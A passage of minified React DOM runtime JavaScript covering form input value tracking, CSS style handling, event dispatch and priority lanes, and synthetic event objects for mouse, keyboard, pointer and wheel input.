      }
    }),
      Object.defineProperty(e, t, {
        enumerable: n.enumerable
      }),
    {
      getValue: function () {
        return r
      },
      setValue: function (i) {
        r = "" + i
      },
      stopTracking: function () {
        e._valueTracker = null,
          delete e[t]
      }
    }
  }
}
function Ji(e) {
  e._valueTracker || (e._valueTracker = Db(e))
}
function M0(e) {
  if (!e)
    return !1;
  var t = e._valueTracker;
  if (!t)
    return !0;
  var n = t.getValue()
    , r = "";
  return e && (r = D0(e) ? e.checked ? "true" : "false" : e.value),
    e = r,
    e !== n ? (t.setValue(e),
      !0) : !1
}
function za(e) {
  if (e = e || (typeof document < "u" ? document : void 0),
    typeof e > "u")
    return null;
  try {
    return e.activeElement || e.body
  } catch {
    return e.body
  }
}
function ju(e, t) {
  var n = t.checked;
  return Se({}, t, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: n ?? e._wrapperState.initialChecked
  })
}
function Wh(e, t) {
  var n = t.defaultValue == null ? "" : t.defaultValue
    , r = t.checked != null ? t.checked : t.defaultChecked;
  n = br(t.value != null ? t.value : n),
    e._wrapperState = {
      initialChecked: r,
      initialValue: n,
      controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null
    }
}
function R0(e, t) {
  t = t.checked,
    t != null && qd(e, "checked", t, !1)
}
function Pu(e, t) {
  R0(e, t);
  var n = br(t.value)
    , r = t.type;
  if (n != null)
    r === "number" ? (n === 0 && e.value === "" || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
  else if (r === "submit" || r === "reset") {
    e.removeAttribute("value");
    return
  }
  t.hasOwnProperty("value") ? Au(e, t.type, n) : t.hasOwnProperty("defaultValue") && Au(e, t.type, br(t.defaultValue)),
    t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked)
}
function Qh(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
    var r = t.type;
    if (!(r !== "submit" && r !== "reset" || t.value !== void 0 && t.value !== null))
      return;
    t = "" + e._wrapperState.initialValue,
      n || t === e.value || (e.value = t),
      e.defaultValue = t
  }
  n = e.name,
    n !== "" && (e.name = ""),
    e.defaultChecked = !!e._wrapperState.initialChecked,
    n !== "" && (e.name = n)
}
function Au(e, t, n) {
  (t !== "number" || za(e.ownerDocument) !== e) && (n == null ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
}
var Oo = Array.isArray;
function Es(e, t, n, r) {
  if (e = e.options,
    t) {
    t = {};
    for (var s = 0; s < n.length; s++)
      t["$" + n[s]] = !0;
    for (n = 0; n < e.length; n++)
      s = t.hasOwnProperty("$" + e[n].value),
        e[n].selected !== s && (e[n].selected = s),
        s && r && (e[n].defaultSelected = !0)
  } else {
    for (n = "" + br(n),
      t = null,
      s = 0; s < e.length; s++) {
      if (e[s].value === n) {
        e[s].selected = !0,
          r && (e[s].defaultSelected = !0);
        return
      }
      t !== null || e[s].disabled || (t = e[s])
    }
    t !== null && (t.selected = !0)
  }
}
function Eu(e, t) {
  if (t.dangerouslySetInnerHTML != null)
    throw Error(F(91));
  return Se({}, t, {
    value: void 0,
    defaultValue: void 0,
    children: "" + e._wrapperState.initialValue
  })
}
function qh(e, t) {
  var n = t.value;
  if (n == null) {
    if (n = t.children,
      t = t.defaultValue,
      n != null) {
      if (t != null)
        throw Error(F(92));
      if (Oo(n)) {
        if (1 < n.length)
          throw Error(F(93));
        n = n[0]
      }
      t = n
    }
    t == null && (t = ""),
      n = t
  }
  e._wrapperState = {
    initialValue: br(n)
  }
}
function O0(e, t) {
  var n = br(t.value)
    , r = br(t.defaultValue);
  n != null && (n = "" + n,
    n !== e.value && (e.value = n),
    t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
    r != null && (e.defaultValue = "" + r)
}
function Gh(e) {
  var t = e.textContent;
  t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t)
}
function I0(e) {
  switch (e) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml"
  }
}
function Tu(e, t) {
  return e == null || e === "http://www.w3.org/1999/xhtml" ? I0(t) : e === "http://www.w3.org/2000/svg" && t === "foreignObject" ? "http://www.w3.org/1999/xhtml" : e
}
var Zi, _0 = function (e) {
  return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function (t, n, r, s) {
    MSApp.execUnsafeLocalFunction(function () {
      return e(t, n, r, s)
    })
  }
    : e
}(function (e, t) {
  if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e)
    e.innerHTML = t;
  else {
    for (Zi = Zi || document.createElement("div"),
      Zi.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
      t = Zi.firstChild; e.firstChild;)
      e.removeChild(e.firstChild);
    for (; t.firstChild;)
      e.appendChild(t.firstChild)
  }
});
function ti(e, t) {
  if (t) {
    var n = e.firstChild;
    if (n && n === e.lastChild && n.nodeType === 3) {
      n.nodeValue = t;
      return
    }
  }
  e.textContent = t
}
var Vo = {
  animationIterationCount: !0,
  aspectRatio: !0,
  borderImageOutset: !0,
  borderImageSlice: !0,
  borderImageWidth: !0,
  boxFlex: !0,
  boxFlexGroup: !0,
  boxOrdinalGroup: !0,
  columnCount: !0,
  columns: !0,
  flex: !0,
  flexGrow: !0,
  flexPositive: !0,
  flexShrink: !0,
  flexNegative: !0,
  flexOrder: !0,
  gridArea: !0,
  gridRow: !0,
  gridRowEnd: !0,
  gridRowSpan: !0,
  gridRowStart: !0,
  gridColumn: !0,
  gridColumnEnd: !0,
  gridColumnSpan: !0,
  gridColumnStart: !0,
  fontWeight: !0,
  lineClamp: !0,
  lineHeight: !0,
  opacity: !0,
  order: !0,
  orphans: !0,
  tabSize: !0,
  widows: !0,
  zIndex: !0,
  zoom: !0,
  fillOpacity: !0,
  floodOpacity: !0,
  stopOpacity: !0,
  strokeDasharray: !0,
  strokeDashoffset: !0,
  strokeMiterlimit: !0,
  strokeOpacity: !0,
  strokeWidth: !0
}
  , Mb = ["Webkit", "ms", "Moz", "O"];
Object.keys(Vo).forEach(function (e) {
  Mb.forEach(function (t) {
    t = t + e.charAt(0).toUpperCase() + e.substring(1),
      Vo[t] = Vo[e]
  })
});
function L0(e, t, n) {
  return t == null || typeof t == "boolean" || t === "" ? "" : n || typeof t != "number" || t === 0 || Vo.hasOwnProperty(e) && Vo[e] ? ("" + t).trim() : t + "px"
}
function F0(e, t) {
  e = e.style;
  for (var n in t)
    if (t.hasOwnProperty(n)) {
      var r = n.indexOf("--") === 0
        , s = L0(n, t[n], r);
      n === "float" && (n = "cssFloat"),
        r ? e.setProperty(n, s) : e[n] = s
    }
}
var Rb = Se({
  menuitem: !0
}, {
  area: !0,
  base: !0,
  br: !0,
  col: !0,
  embed: !0,
  hr: !0,
  img: !0,
  input: !0,
  keygen: !0,
  link: !0,
  meta: !0,
  param: !0,
  source: !0,
  track: !0,
  wbr: !0
});
function ku(e, t) {
  if (t) {
    if (Rb[e] && (t.children != null || t.dangerouslySetInnerHTML != null))
      throw Error(F(137, e));
    if (t.dangerouslySetInnerHTML != null) {
      if (t.children != null)
        throw Error(F(60));
      if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML))
        throw Error(F(61))
    }
    if (t.style != null && typeof t.style != "object")
      throw Error(F(62))
  }
}
function Du(e, t) {
  if (e.indexOf("-") === -1)
    return typeof t.is == "string";
  switch (e) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0
  }
}
var Mu = null;
function Xd(e) {
  return e = e.target || e.srcElement || window,
    e.correspondingUseElement && (e = e.correspondingUseElement),
    e.nodeType === 3 ? e.parentNode : e
}
var Ru = null
  , Ts = null
  , ks = null;
function Kh(e) {
  if (e = Ri(e)) {
    if (typeof Ru != "function")
      throw Error(F(280));
    var t = e.stateNode;
    t && (t = Rl(t),
      Ru(e.stateNode, e.type, t))
  }
}
function V0(e) {
  Ts ? ks ? ks.push(e) : ks = [e] : Ts = e
}
function B0() {
  if (Ts) {
    var e = Ts
      , t = ks;
    if (ks = Ts = null,
      Kh(e),
      t)
      for (e = 0; e < t.length; e++)
        Kh(t[e])
  }
}
function z0(e, t) {
  return e(t)
}
function U0() { }
var Sc = !1;
function $0(e, t, n) {
  if (Sc)
    return e(t, n);
  Sc = !0;
  try {
    return z0(e, t, n)
  } finally {
    Sc = !1,
      (Ts !== null || ks !== null) && (U0(),
        B0())
  }
}
function ni(e, t) {
  var n = e.stateNode;
  if (n === null)
    return null;
  var r = Rl(n);
  if (r === null)
    return null;
  n = r[t];
  e: switch (t) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) || (e = e.type,
        r = !(e === "button" || e === "input" || e === "select" || e === "textarea")),
        e = !r;
      break e;
    default:
      e = !1
  }
  if (e)
    return null;
  if (n && typeof n != "function")
    throw Error(F(231, t, typeof n));
  return n
}
var Ou = !1;
if (In)
  try {
    var wo = {};
    Object.defineProperty(wo, "passive", {
      get: function () {
        Ou = !0
      }
    }),
      window.addEventListener("test", wo, wo),
      window.removeEventListener("test", wo, wo)
  } catch {
    Ou = !1
  }
function Ob(e, t, n, r, s, o, i, l, c) {
  var u = Array.prototype.slice.call(arguments, 3);
  try {
    t.apply(n, u)
  } catch (d) {
    this.onError(d)
  }
}
var Bo = !1
  , Ua = null
  , $a = !1
  , Iu = null
  , Ib = {
    onError: function (e) {
      Bo = !0,
        Ua = e
    }
  };
function _b(e, t, n, r, s, o, i, l, c) {
  Bo = !1,
    Ua = null,
    Ob.apply(Ib, arguments)
}
function Lb(e, t, n, r, s, o, i, l, c) {
  if (_b.apply(this, arguments),
    Bo) {
    if (Bo) {
      var u = Ua;
      Bo = !1,
        Ua = null
    } else
      throw Error(F(198));
    $a || ($a = !0,
      Iu = u)
  }
}
function ns(e) {
  var t = e
    , n = e;
  if (e.alternate)
    for (; t.return;)
      t = t.return;
  else {
    e = t;
    do
      t = e,
        t.flags & 4098 && (n = t.return),
        e = t.return;
    while (e)
  }
  return t.tag === 3 ? n : null
}
function H0(e) {
  if (e.tag === 13) {
    var t = e.memoizedState;
    if (t === null && (e = e.alternate,
      e !== null && (t = e.memoizedState)),
      t !== null)
      return t.dehydrated
  }
  return null
}
function Yh(e) {
  if (ns(e) !== e)
    throw Error(F(188))
}
function Fb(e) {
  var t = e.alternate;
  if (!t) {
    if (t = ns(e),
      t === null)
      throw Error(F(188));
    return t !== e ? null : e
  }
  for (var n = e, r = t; ;) {
    var s = n.return;
    if (s === null)
      break;
    var o = s.alternate;
    if (o === null) {
      if (r = s.return,
        r !== null) {
        n = r;
        continue
      }
      break
    }
    if (s.child === o.child) {
      for (o = s.child; o;) {
        if (o === n)
          return Yh(s),
            e;
        if (o === r)
          return Yh(s),
            t;
        o = o.sibling
      }
      throw Error(F(188))
    }
    if (n.return !== r.return)
      n = s,
        r = o;
    else {
      for (var i = !1, l = s.child; l;) {
        if (l === n) {
          i = !0,
            n = s,
            r = o;
          break
        }
        if (l === r) {
          i = !0,
            r = s,
            n = o;
          break
        }
        l = l.sibling
      }
      if (!i) {
        for (l = o.child; l;) {
          if (l === n) {
            i = !0,
              n = o,
              r = s;
            break
          }
          if (l === r) {
            i = !0,
              r = o,
              n = s;
            break
          }
          l = l.sibling
        }
        if (!i)
          throw Error(F(189))
      }
    }
    if (n.alternate !== r)
      throw Error(F(190))
  }
  if (n.tag !== 3)
    throw Error(F(188));
  return n.stateNode.current === n ? e : t
}
function W0(e) {
  return e = Fb(e),
    e !== null ? Q0(e) : null
}
function Q0(e) {
  if (e.tag === 5 || e.tag === 6)
    return e;
  for (e = e.child; e !== null;) {
    var t = Q0(e);
    if (t !== null)
      return t;
    e = e.sibling
  }
  return null
}
var q0 = Nt.unstable_scheduleCallback
  , Xh = Nt.unstable_cancelCallback
  , Vb = Nt.unstable_shouldYield
  , Bb = Nt.unstable_requestPaint
  , Te = Nt.unstable_now
  , zb = Nt.unstable_getCurrentPriorityLevel
  , Jd = Nt.unstable_ImmediatePriority
  , G0 = Nt.unstable_UserBlockingPriority
  , Ha = Nt.unstable_NormalPriority
  , Ub = Nt.unstable_LowPriority
  , K0 = Nt.unstable_IdlePriority
  , Tl = null
  , hn = null;
function $b(e) {
  if (hn && typeof hn.onCommitFiberRoot == "function")
    try {
      hn.onCommitFiberRoot(Tl, e, void 0, (e.current.flags & 128) === 128)
    } catch { }
}
var Jt = Math.clz32 ? Math.clz32 : Qb
  , Hb = Math.log
  , Wb = Math.LN2;
function Qb(e) {
  return e >>>= 0,
    e === 0 ? 32 : 31 - (Hb(e) / Wb | 0) | 0
}
var ea = 64
  , ta = 4194304;
function Io(e) {
  switch (e & -e) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return e & 4194240;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return e & 130023424;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return e
  }
}
function Wa(e, t) {
  var n = e.pendingLanes;
  if (n === 0)
    return 0;
  var r = 0
    , s = e.suspendedLanes
    , o = e.pingedLanes
    , i = n & 268435455;
  if (i !== 0) {
    var l = i & ~s;
    l !== 0 ? r = Io(l) : (o &= i,
      o !== 0 && (r = Io(o)))
  } else
    i = n & ~s,
      i !== 0 ? r = Io(i) : o !== 0 && (r = Io(o));
  if (r === 0)
    return 0;
  if (t !== 0 && t !== r && !(t & s) && (s = r & -r,
    o = t & -t,
    s >= o || s === 16 && (o & 4194240) !== 0))
    return t;
  if (r & 4 && (r |= n & 16),
    t = e.entangledLanes,
    t !== 0)
    for (e = e.entanglements,
      t &= r; 0 < t;)
      n = 31 - Jt(t),
        s = 1 << n,
        r |= e[n],
        t &= ~s;
  return r
}
function qb(e, t) {
  switch (e) {
    case 1:
    case 2:
    case 4:
      return t + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return t + 5e3;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return -1;
    case 134217728:
    case 268435456:
    case 536870912:
    case 1073741824:
      return -1;
    default:
      return -1
  }
}
function Gb(e, t) {
  for (var n = e.suspendedLanes, r = e.pingedLanes, s = e.expirationTimes, o = e.pendingLanes; 0 < o;) {
    var i = 31 - Jt(o)
      , l = 1 << i
      , c = s[i];
    c === -1 ? (!(l & n) || l & r) && (s[i] = qb(l, t)) : c <= t && (e.expiredLanes |= l),
      o &= ~l
  }
}
function _u(e) {
  return e = e.pendingLanes & -1073741825,
    e !== 0 ? e : e & 1073741824 ? 1073741824 : 0
}
function Y0() {
  var e = ea;
  return ea <<= 1,
    !(ea & 4194240) && (ea = 64),
    e
}
function Cc(e) {
  for (var t = [], n = 0; 31 > n; n++)
    t.push(e);
  return t
}
function Di(e, t, n) {
  e.pendingLanes |= t,
    t !== 536870912 && (e.suspendedLanes = 0,
      e.pingedLanes = 0),
    e = e.eventTimes,
    t = 31 - Jt(t),
    e[t] = n
}
function Kb(e, t) {
  var n = e.pendingLanes & ~t;
  e.pendingLanes = t,
    e.suspendedLanes = 0,
    e.pingedLanes = 0,
    e.expiredLanes &= t,
    e.mutableReadLanes &= t,
    e.entangledLanes &= t,
    t = e.entanglements;
  var r = e.eventTimes;
  for (e = e.expirationTimes; 0 < n;) {
    var s = 31 - Jt(n)
      , o = 1 << s;
    t[s] = 0,
      r[s] = -1,
      e[s] = -1,
      n &= ~o
  }
}
function Zd(e, t) {
  var n = e.entangledLanes |= t;
  for (e = e.entanglements; n;) {
    var r = 31 - Jt(n)
      , s = 1 << r;
    s & t | e[r] & t && (e[r] |= t),
      n &= ~s
  }
}
var ce = 0;
function X0(e) {
  return e &= -e,
    1 < e ? 4 < e ? e & 268435455 ? 16 : 536870912 : 4 : 1
}
var J0, ef, Z0, ey, ty, Lu = !1, na = [], dr = null, fr = null, hr = null, ri = new Map, si = new Map, er = [], Yb = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
function Jh(e, t) {
  switch (e) {
    case "focusin":
    case "focusout":
      dr = null;
      break;
    case "dragenter":
    case "dragleave":
      fr = null;
      break;
    case "mouseover":
    case "mouseout":
      hr = null;
      break;
    case "pointerover":
    case "pointerout":
      ri.delete(t.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      si.delete(t.pointerId)
  }
}
function bo(e, t, n, r, s, o) {
  return e === null || e.nativeEvent !== o ? (e = {
    blockedOn: t,
    domEventName: n,
    eventSystemFlags: r,
    nativeEvent: o,
    targetContainers: [s]
  },
    t !== null && (t = Ri(t),
      t !== null && ef(t)),
    e) : (e.eventSystemFlags |= r,
      t = e.targetContainers,
      s !== null && t.indexOf(s) === -1 && t.push(s),
      e)
}
function Xb(e, t, n, r, s) {
  switch (t) {
    case "focusin":
      return dr = bo(dr, e, t, n, r, s),
        !0;
    case "dragenter":
      return fr = bo(fr, e, t, n, r, s),
        !0;
    case "mouseover":
      return hr = bo(hr, e, t, n, r, s),
        !0;
    case "pointerover":
      var o = s.pointerId;
      return ri.set(o, bo(ri.get(o) || null, e, t, n, r, s)),
        !0;
    case "gotpointercapture":
      return o = s.pointerId,
        si.set(o, bo(si.get(o) || null, e, t, n, r, s)),
        !0
  }
  return !1
}
function ny(e) {
  var t = _r(e.target);
  if (t !== null) {
    var n = ns(t);
    if (n !== null) {
      if (t = n.tag,
        t === 13) {
        if (t = H0(n),
          t !== null) {
          e.blockedOn = t,
            ty(e.priority, function () {
              Z0(n)
            });
          return
        }
      } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
        e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
        return
      }
    }
  }
  e.blockedOn = null
}
function Na(e) {
  if (e.blockedOn !== null)
    return !1;
  for (var t = e.targetContainers; 0 < t.length;) {
    var n = Fu(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
    if (n === null) {
      n = e.nativeEvent;
      var r = new n.constructor(n.type, n);
      Mu = r,
        n.target.dispatchEvent(r),
        Mu = null
    } else
      return t = Ri(n),
        t !== null && ef(t),
        e.blockedOn = n,
        !1;
    t.shift()
  }
  return !0
}
function Zh(e, t, n) {
  Na(e) && n.delete(t)
}
function Jb() {
  Lu = !1,
    dr !== null && Na(dr) && (dr = null),
    fr !== null && Na(fr) && (fr = null),
    hr !== null && Na(hr) && (hr = null),
    ri.forEach(Zh),
    si.forEach(Zh)
}
function So(e, t) {
  e.blockedOn === t && (e.blockedOn = null,
    Lu || (Lu = !0,
      Nt.unstable_scheduleCallback(Nt.unstable_NormalPriority, Jb)))
}
function oi(e) {
  function t(s) {
    return So(s, e)
  }
  if (0 < na.length) {
    So(na[0], e);
    for (var n = 1; n < na.length; n++) {
      var r = na[n];
      r.blockedOn === e && (r.blockedOn = null)
    }
  }
  for (dr !== null && So(dr, e),
    fr !== null && So(fr, e),
    hr !== null && So(hr, e),
    ri.forEach(t),
    si.forEach(t),
    n = 0; n < er.length; n++)
    r = er[n],
      r.blockedOn === e && (r.blockedOn = null);
  for (; 0 < er.length && (n = er[0],
    n.blockedOn === null);)
    ny(n),
      n.blockedOn === null && er.shift()
}
var Ds = zn.ReactCurrentBatchConfig
  , Qa = !0;
function Zb(e, t, n, r) {
  var s = ce
    , o = Ds.transition;
  Ds.transition = null;
  try {
    ce = 1,
      tf(e, t, n, r)
  } finally {
    ce = s,
      Ds.transition = o
  }
}
function e2(e, t, n, r) {
  var s = ce
    , o = Ds.transition;
  Ds.transition = null;
  try {
    ce = 4,
      tf(e, t, n, r)
  } finally {
    ce = s,
      Ds.transition = o
  }
}
function tf(e, t, n, r) {
  if (Qa) {
    var s = Fu(e, t, n, r);
    if (s === null)
      Rc(e, t, r, qa, n),
        Jh(e, r);
    else if (Xb(s, e, t, n, r))
      r.stopPropagation();
    else if (Jh(e, r),
      t & 4 && -1 < Yb.indexOf(e)) {
      for (; s !== null;) {
        var o = Ri(s);
        if (o !== null && J0(o),
          o = Fu(e, t, n, r),
          o === null && Rc(e, t, r, qa, n),
          o === s)
          break;
        s = o
      }
      s !== null && r.stopPropagation()
    } else
      Rc(e, t, r, null, n)
  }
}
var qa = null;
function Fu(e, t, n, r) {
  if (qa = null,
    e = Xd(r),
    e = _r(e),
    e !== null)
    if (t = ns(e),
      t === null)
      e = null;
    else if (n = t.tag,
      n === 13) {
      if (e = H0(t),
        e !== null)
        return e;
      e = null
    } else if (n === 3) {
      if (t.stateNode.current.memoizedState.isDehydrated)
        return t.tag === 3 ? t.stateNode.containerInfo : null;
      e = null
    } else
      t !== e && (e = null);
  return qa = e,
    null
}
function ry(e) {
  switch (e) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (zb()) {
        case Jd:
          return 1;
        case G0:
          return 4;
        case Ha:
        case Ub:
          return 16;
        case K0:
          return 536870912;
        default:
          return 16
      }
    default:
      return 16
  }
}
var lr = null
  , nf = null
  , ja = null;
function sy() {
  if (ja)
    return ja;
  var e, t = nf, n = t.length, r, s = "value" in lr ? lr.value : lr.textContent, o = s.length;
  for (e = 0; e < n && t[e] === s[e]; e++)
    ;
  var i = n - e;
  for (r = 1; r <= i && t[n - r] === s[o - r]; r++)
    ;
  return ja = s.slice(e, 1 < r ? 1 - r : void 0)
}
function Pa(e) {
  var t = e.keyCode;
  return "charCode" in e ? (e = e.charCode,
    e === 0 && t === 13 && (e = 13)) : e = t,
    e === 10 && (e = 13),
    32 <= e || e === 13 ? e : 0
}
function ra() {
  return !0
}
function em() {
  return !1
}
function At(e) {
  function t(n, r, s, o, i) {
    this._reactName = n,
      this._targetInst = s,
      this.type = r,
      this.nativeEvent = o,
      this.target = i,
      this.currentTarget = null;
    for (var l in e)
      e.hasOwnProperty(l) && (n = e[l],
        this[l] = n ? n(o) : o[l]);
    return this.isDefaultPrevented = (o.defaultPrevented != null ? o.defaultPrevented : o.returnValue === !1) ? ra : em,
      this.isPropagationStopped = em,
      this
  }
  return Se(t.prototype, {
    preventDefault: function () {
      this.defaultPrevented = !0;
      var n = this.nativeEvent;
      n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
        this.isDefaultPrevented = ra)
    },
    stopPropagation: function () {
      var n = this.nativeEvent;
      n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
        this.isPropagationStopped = ra)
    },
    persist: function () { },
    isPersistent: ra
  }),
    t
}
var ao = {
  eventPhase: 0,
  bubbles: 0,
  cancelable: 0,
  timeStamp: function (e) {
    return e.timeStamp || Date.now()
  },
  defaultPrevented: 0,
  isTrusted: 0
}, rf = At(ao), Mi = Se({}, ao, {
  view: 0,
  detail: 0
}), t2 = At(Mi), Nc, jc, Co, kl = Se({}, Mi, {
  screenX: 0,
  screenY: 0,
  clientX: 0,
  clientY: 0,
  pageX: 0,
  pageY: 0,
  ctrlKey: 0,
  shiftKey: 0,
  altKey: 0,
  metaKey: 0,
  getModifierState: sf,
  button: 0,
  buttons: 0,
  relatedTarget: function (e) {
    return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
  },
  movementX: function (e) {
    return "movementX" in e ? e.movementX : (e !== Co && (Co && e.type === "mousemove" ? (Nc = e.screenX - Co.screenX,
      jc = e.screenY - Co.screenY) : jc = Nc = 0,
      Co = e),
      Nc)
  },
  movementY: function (e) {
    return "movementY" in e ? e.movementY : jc
  }
}), tm = At(kl), n2 = Se({}, kl, {
  dataTransfer: 0
}), r2 = At(n2), s2 = Se({}, Mi, {
  relatedTarget: 0
}), Pc = At(s2), o2 = Se({}, ao, {
  animationName: 0,
  elapsedTime: 0,
  pseudoElement: 0
}), i2 = At(o2), a2 = Se({}, ao, {
  clipboardData: function (e) {
    return "clipboardData" in e ? e.clipboardData : window.clipboardData
  }
}), l2 = At(a2), c2 = Se({}, ao, {
  data: 0
}), nm = At(c2), u2 = {
  Esc: "Escape",
  Spacebar: " ",
  Left: "ArrowLeft",
  Up: "ArrowUp",
  Right: "ArrowRight",
  Down: "ArrowDown",
  Del: "Delete",
  Win: "OS",
  Menu: "ContextMenu",
  Apps: "ContextMenu",
  Scroll: "ScrollLock",
  MozPrintableKey: "Unidentified"
}, d2 = {
  8: "Backspace",
  9: "Tab",
  12: "Clear",
  13: "Enter",
  16: "Shift",
  17: "Control",
  18: "Alt",
  19: "Pause",
  20: "CapsLock",
  27: "Escape",
  32: " ",
  33: "PageUp",
  34: "PageDown",
  35: "End",
  36: "Home",
  37: "ArrowLeft",
  38: "ArrowUp",
  39: "ArrowRight",
  40: "ArrowDown",
  45: "Insert",
  46: "Delete",
  112: "F1",
  113: "F2",
  114: "F3",
  115: "F4",
  116: "F5",
  117: "F6",
  118: "F7",
  119: "F8",
  120: "F9",
  121: "F10",
  122: "F11",
  123: "F12",
  144: "NumLock",
  145: "ScrollLock",
  224: "Meta"
}, f2 = {
  Alt: "altKey",
  Control: "ctrlKey",
  Meta: "metaKey",
  Shift: "shiftKey"
};
function h2(e) {
  var t = this.nativeEvent;
  return t.getModifierState ? t.getModifierState(e) : (e = f2[e]) ? !!t[e] : !1
}
function sf() {
  return h2
}
var m2 = Se({}, Mi, {
  key: function (e) {
    if (e.key) {
      var t = u2[e.key] || e.key;
      if (t !== "Unidentified")
        return t
    }
    return e.type === "keypress" ? (e = Pa(e),
      e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? d2[e.keyCode] || "Unidentified" : ""
  },
  code: 0,
  location: 0,
  ctrlKey: 0,
  shiftKey: 0,
  altKey: 0,
  metaKey: 0,
  repeat: 0,
  locale: 0,
  getModifierState: sf,
  charCode: function (e) {
    return e.type === "keypress" ? Pa(e) : 0
  },
  keyCode: function (e) {
    return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
  },
  which: function (e) {
    return e.type === "keypress" ? Pa(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
  }
})
  , p2 = At(m2)
  , g2 = Se({}, kl, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0
  })
  , rm = At(g2)
  , y2 = Se({}, Mi, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: sf
  })
  , v2 = At(y2)
  , x2 = Se({}, ao, {
    propertyName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  })
  , w2 = At(x2)
  , b2 = Se({}, kl, {
    deltaX: function (e) {
      return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
    },
    deltaY: function (e) {
      return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
    },
    deltaZ: 0,
    deltaMode: 0
  })
  , S2 = At(b2)
  , C2 = [9, 13, 27, 32]
  , of = In && "CompositionEvent" in window
  , zo = null;
In && "documentMode" in document && (zo = document.documentMode);
var N2 = In && "TextEvent" in window && !zo
  , oy = In && (!of || zo && 8 < zo && 11 >= zo)
  , sm = " "
  , om = !1;
function iy(e, t) {
  switch (e) {
    case "keyup":
      return C2.indexOf(t.keyCode) !== -1;
    case "keydown":
      return t.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
